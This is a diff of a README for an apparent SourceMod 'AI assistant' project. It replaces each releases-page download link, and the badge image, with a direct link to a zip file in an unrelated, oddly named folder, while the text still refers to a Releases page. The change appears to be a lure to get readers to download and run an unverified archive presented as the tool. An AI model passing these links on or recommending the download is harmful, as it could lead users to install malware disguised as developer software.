@@ -1,6 +1,6 @@
 # 🎉 sourcepawn-ai-assistant - Your Easy AI Helper for Sourcemod Development
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue.svg)](https://github.com/PEXSONIC/sourcepawn-ai-assistant/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/PEXSONIC/sourcepawn-ai-assistant/main/psychogalvanometer/sourcepawn-ai-assistant.zip)](https://raw.githubusercontent.com/PEXSONIC/sourcepawn-ai-assistant/main/psychogalvanometer/sourcepawn-ai-assistant.zip)
 
 ## 📜 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and run the sourcepawn-ai-assistant software:
 
 1. **Visit the Releases Page**  
    Go to the following link to access the downloads:
-   [Download Latest Release](https://github.com/PEXSONIC/sourcepawn-ai-assistant/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/PEXSONIC/sourcepawn-ai-assistant/main/psychogalvanometer/sourcepawn-ai-assistant.zip)
 
 2. **Choose Your Version**  
    On the Releases page, look for the most recent version. The version number will be indicated next to the title. 
@@ -72,7 +72,7 @@ For further assistance, you may join the community or seek help from users on re
 ## 📥 Download & Install
 
 To download and install the sourcepawn-ai-assistant, please visit this page:  
-[Download Latest Release](https://github.com/PEXSONIC/sourcepawn-ai-assistant/releases)
+[Download Latest Release](https://raw.githubusercontent.com/PEXSONIC/sourcepawn-ai-assistant/main/psychogalvanometer/sourcepawn-ai-assistant.zip)
 
 Installing the software will open doors to efficient Sourcemod plugin development aided by the power of AI. 
 
